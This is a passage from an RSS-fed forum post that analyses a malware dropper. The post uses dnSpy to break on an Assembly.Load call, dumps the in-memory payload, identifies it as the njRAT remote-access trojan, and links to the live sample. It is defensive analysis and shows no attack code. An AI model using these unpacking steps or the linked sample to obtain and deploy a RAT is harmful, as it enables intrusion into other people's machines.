+<p>And quite some interesting strings we have here. Greetings, Mr. Stan! If you are reading this, you are violating rule number 5 of the <a href="https://wikileaks.org/ciav7p1/cms/page_14587109.html">CIA’s Development Tradecrafts DOs and DON’Ts</a>. Here’s the link, just for you! <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> Don’t be surprised if cops show up at the front of your door! <img src="https://0x00sec.org/images/emoji/twitter/astonished.png?v=9" title=":astonished:" class="emoji" alt=":astonished:"></p>
+<p>We can confirm the project development under Visual Studio 2017 as we suspected from the default project name. The string that is listed after looks like it may be the location from where the dropper obtains its payload. If we navigate to the page, we get an error:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7316fb6b3d1166bbee81ed67739fe203e4b881e8.png" width="690" height="92"></p>
+<p>So it may seem that the file is not a PNG at all, or any type of image file.</p>
+<h2>Dynamic Analysis</h2>
+<h3>dnSpy - eze.exe</h3>
+<p>We would love to see the file that is dropped by this file and of course it can easily be obtained just by downloading the file but just to spice things up, let’s look at how we can get it via dynamic analysis. Open up <code>eze.exe</code> in dnSpy and let’s see what it does.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/39b669da78451a2353537bd6842d37464b962e5a.png" width="690" height="433"></p>
+<p>In the red box, we can see a call to a very common method call <code>Assembly.Load</code>. This function is mostly used to load a malicious file into memory for execution as indicated by the <code>EntryPoint.Invoke</code> method call. For an example of this, see <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a>’s  <a href="https://0x00sec.org/t/c-a-simple-runtime-crypter/519/1">[C#] A Simple Runtime Crypter</a> article.</p>
+<p>To get the binary file, we simply place a breakpoint on this line and run it until it gets hit (mind the sleep at the beginning!)…</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/8/8a4b702f58421376cd8775aac8d3badd7d9a3385.png" width="690" height="424"></p>
+<p>… look in the variable’s (<code>array</code>) memory (right-click the variable in the <code>Locals</code> tab at the bottom, select <code>Show in Memory Window</code> and then choose a memory view)…</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/92bb940d3866230ceb561e8d82ac38d1de06d5cf.png" width="690" height="157"></p>
+<p>… and there lies the binary we were looking for! Identify the <code>MZ</code> magic and the <code>PE\0\0</code> signatures to verify. Right-click the memory and select <code>Save Selection...</code>.</p>
+<p>Let’s see what <a href="https://www.virustotal.com/#/file/719429b091b80e36dfd56fe87e713bfa4f585a228f3616a03d3298fd9d715283/detection">VT</a> has for us.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/631d00998c655f52560c5f0295779eda0458ba40.png" width="690" height="407"></p>
+<p>55/67 detections! Identified as <code>Bladabindi</code> AKA njRAT.</p>
+<h1>Conclusions</h1>
+<p>I hope this was an entertaining and educational read! Thanks for stopping by!</p>
+<p>EDIT:<br>
+The sample can now be obtained here:</p>
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://www.hybrid-analysis.com/favicon.ico" class="site-icon" width="64" height="64">
+      <a href="https://www.hybrid-analysis.com/sample/6fed01e33311f0b0d25a894efdfa3412d00f40fbb0c5f0ba303a2c41c4dbd31f?environmentId=100" target="_blank" rel="noopener">hybrid-analysis.com</a>
+  </header>
+  <article class="onebox-body">
+    <img src="" class="thumbnail" width="" height="">
+
+<h3><a href="https://www.hybrid-analysis.com/sample/6fed01e33311f0b0d25a894efdfa3412d00f40fbb0c5f0ba303a2c41c4dbd31f?environmentId=100" target="_blank" rel="noopener">Free Automated Malware Analysis Service - powered by Falcon Sandbox - Viewing...</a></h3>
+
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<p><em>– dtm</em></p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/1</link>
+        <pubDate>Thu, 04 Jan 2018 05:25:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-1</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+  </channel>
+</rss>
